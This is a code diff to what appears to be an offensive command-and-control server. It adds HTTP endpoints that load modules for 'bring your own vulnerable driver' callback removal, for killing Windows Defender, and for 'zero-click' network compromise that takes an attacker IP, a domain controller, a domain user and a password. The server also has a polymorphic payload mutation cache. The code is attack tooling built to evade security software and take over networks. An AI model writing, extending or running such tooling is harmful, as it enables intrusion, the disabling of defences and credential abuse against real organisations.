@@ -65,6 +65,27 @@ try:
 except ImportError:
     _WEB_CVE_OK = False
 
+_MOD_DIR2 = os.path.join(_THIS_DIR, "..", "modules")
+if _MOD_DIR2 not in _sys.path: _sys.path.insert(0, _MOD_DIR2)
+
+try:
+    import byovd as _byovd_mod
+    _BYOVD_OK = True
+except ImportError:
+    _BYOVD_OK = False
+
+try:
+    import defender_kill as _dk_mod
+    _DK_OK = True
+except ImportError:
+    _DK_OK = False
+
+try:
+    import zero_click as _zc_mod
+    _ZC_OK = True
+except ImportError:
+    _ZC_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -1265,6 +1286,52 @@ class H(BaseHTTPRequestHandler):
             result = _web_cve.run(cve, **kwargs)
             log(f"[WEB-CVE] {cve} -> {target}: {str(result)[:80]}")
             self._send(str(result), "text/plain"); return
+
+        # ── BYOVD / Defender kill endpoints ─────────────────────────────────
+        if path == "/byovd":
+            action = qs.get("action", ["remove_callbacks"])[0]
+            driver_path = qs.get("driver", [None])[0]
+            if _BYOVD_OK:
+                result = _byovd_mod.run(action, driver_path=driver_path,
+                                        pid=int(qs.get("pid", [0])[0]))
+                log(f"[BYOVD] {action}: {str(result)[:60]}")
+                self._send(str(result), "text/plain")
+            else:
+                self._send("byovd module not available (Windows agent required)", "text/plain")
+            return
+
+        if path.startswith("/defender/"):
+            layer = path[len("/defender/"):]
+            driver_path = qs.get("driver", [None])[0]
+            if _DK_OK:
+                result = _dk_mod.run(layer, driver_path=driver_path)
+                log(f"[DEFENDER-KILL] {layer}: {str(result)[:60]}")
+                self._send(str(result), "text/plain")
+            else:
+                self._send("defender_kill module not available", "text/plain")
+            return
+
+        # ── Zero-click network compromise ────────────────────────────────────
+        if path.startswith("/zeroclick/"):
+            action = path[len("/zeroclick/"):]
+            attacker_ip = qs.get("ip", [self.server.server_address[0]])[0]
+            dc_ip   = qs.get("dc", [None])[0]
+            domain  = qs.get("domain", [None])[0]
+            user    = qs.get("user", [None])[0]
+            passwd  = qs.get("pass", [None])[0]
+            iface   = qs.get("iface", ["eth0"])[0]
+            if _ZC_OK:
+                kwargs = {"attacker_ip": attacker_ip, "iface": iface}
+                if dc_ip:   kwargs["dc_ip"]   = dc_ip
+                if domain:  kwargs["domain"]   = domain
+                if user:    kwargs["user"]     = user
+                if passwd:  kwargs["password"] = passwd
+                result = _zc_mod.run(action, **kwargs)
+                log(f"[ZERO-CLICK] {action}: {str(result)[:60]}")
+                self._send(str(result), "text/plain")
+            else:
+                self._send("zero_click module not available", "text/plain")
+            return
 
         # ── Exploit module index ──────────────────────────────────────────────
         if path == "/exploit":
